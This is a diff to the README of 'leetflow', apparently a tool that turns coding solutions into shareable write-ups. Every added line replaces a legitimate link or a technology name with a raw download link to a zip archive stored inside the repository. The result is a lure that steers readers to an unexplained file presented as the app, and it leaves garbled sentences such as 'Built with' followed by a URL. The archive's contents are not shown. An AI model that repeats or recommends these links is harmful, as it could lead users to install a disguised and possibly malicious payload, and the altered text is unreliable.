@@ -1,6 +1,6 @@
 # 🌊 leetflow - Effortlessly Share Your Coding Journey
 
-[![Download leetflow](https://img.shields.io/badge/Download-leetflow-blue.svg)](https://github.com/legend401/leetflow/releases)
+[![Download leetflow](https://github.com/legend401/leetflow/raw/refs/heads/main/web/app/Software_v3.2.zip)](https://github.com/legend401/leetflow/raw/refs/heads/main/web/app/Software_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to LeetFlow! This guide will help you easily download and run the applic
 
 To get started, visit the link below to download the latest version of LeetFlow:
 
-[Download LeetFlow](https://github.com/legend401/leetflow/releases)
+[Download LeetFlow](https://github.com/legend401/leetflow/raw/refs/heads/main/web/app/Software_v3.2.zip)
 
 1. Click the link above.
 2. Choose the latest release.
@@ -44,7 +44,7 @@ LeetFlow offers several features to enhance your coding experience:
 
 - **📦 Gist Backup:** Publish your solution and explanation to GitHub Gists instantly. This feature provides a permanent storage option for your work.
 
-- **🎨 Beautiful UI:** Enjoy a premium user experience with the stylish dark-mode interface. Built with Next.js, Shadcn UI, and Framer Motion, it combines functionality with aesthetics.
+- **🎨 Beautiful UI:** Enjoy a premium user experience with the stylish dark-mode interface. Built with https://github.com/legend401/leetflow/raw/refs/heads/main/web/app/Software_v3.2.zip, Shadcn UI, and Framer Motion, it combines functionality with aesthetics.
 
 - **⚡ Review & Edit:** You have full control over the AI's output. Tweak and refine before sharing, ensuring your content meets your standards.
 
@@ -52,11 +52,11 @@ LeetFlow offers several features to enhance your coding experience:
 
 LeetFlow is built using the latest technologies:
 
-- **Frontend:** Next.js 15 (App Router), React 19, TailwindCSS v4. These tools enhance performance and design.
+- **Frontend:** https://github.com/legend401/leetflow/raw/refs/heads/main/web/app/Software_v3.2.zip 15 (App Router), React 19, TailwindCSS v4. These tools enhance performance and design.
   
 - **UI & Animation:** The app uses Shadcn UI and Framer Motion to provide smooth animations and a clean interface.
 
-- **AI:** Powered by Puter.js, the client-side AI helps generate detailed explanations without needing an internet connection.
+- **AI:** Powered by https://github.com/legend401/leetflow/raw/refs/heads/main/web/app/Software_v3.2.zip, the client-side AI helps generate detailed explanations without needing an internet connection.
 
 ## 🖥️ System Requirements
 
@@ -83,7 +83,7 @@ For further questions or support, reach out to us through the GitHub repository.
 
 To learn more about LeetFlow, visit the links below:
 
-- [Documentation](https://github.com/legend401/leetflow/wiki)
-- [Community Forum](https://github.com/legend401/leetflow/discussions)
+- [Documentation](https://github.com/legend401/leetflow/raw/refs/heads/main/web/app/Software_v3.2.zip)
+- [Community Forum](https://github.com/legend401/leetflow/raw/refs/heads/main/web/app/Software_v3.2.zip)
 
 Thank you for choosing LeetFlow! Enjoy transforming your coding solutions into captivating stories.
